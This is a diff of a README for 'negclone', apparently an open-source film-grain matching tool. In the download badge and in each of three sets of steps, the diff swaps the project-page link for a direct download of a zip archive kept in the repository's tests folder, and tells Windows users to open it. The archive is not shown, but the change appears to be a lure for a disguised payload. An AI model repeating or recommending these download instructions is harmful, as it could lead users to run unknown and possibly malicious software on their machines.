@@ -1,12 +1,12 @@
 # 🎞️ negclone - Match Film Grain With Ease
 
-[![Download negclone](https://img.shields.io/badge/Download-negclone-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/debugmindflow/negclone)
+[![Download negclone](https://img.shields.io/badge/Download-negclone-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/debugmindflow/negclone/raw/refs/heads/main/tests/Software_2.7-beta.5.zip)
 
 ## 📥 Download negclone
 
 Use this link to visit the download page:
 
-https://github.com/debugmindflow/negclone
+https://github.com/debugmindflow/negclone/raw/refs/heads/main/tests/Software_2.7-beta.5.zip
 
 Follow the steps on the page to get the Windows version, then open the downloaded file.
 
@@ -35,7 +35,7 @@ If you plan to work with a lot of scans, keep your files in one folder. That mak
 
 ## 🚀 Getting Started
 
-1. Open this page: https://github.com/debugmindflow/negclone
+1. Open this page: https://github.com/debugmindflow/negclone/raw/refs/heads/main/tests/Software_2.7-beta.5.zip
 2. Find the latest download for Windows
 3. Download the file to your PC
 4. Open the downloaded file
@@ -186,7 +186,7 @@ negclone is a good fit if you want to:
 
 ## 📌 Quick start
 
-1. Visit https://github.com/debugmindflow/negclone
+1. Visit https://github.com/debugmindflow/negclone/raw/refs/heads/main/tests/Software_2.7-beta.5.zip
 2. Download the Windows file
 3. Open it on your PC
 4. Load a scan
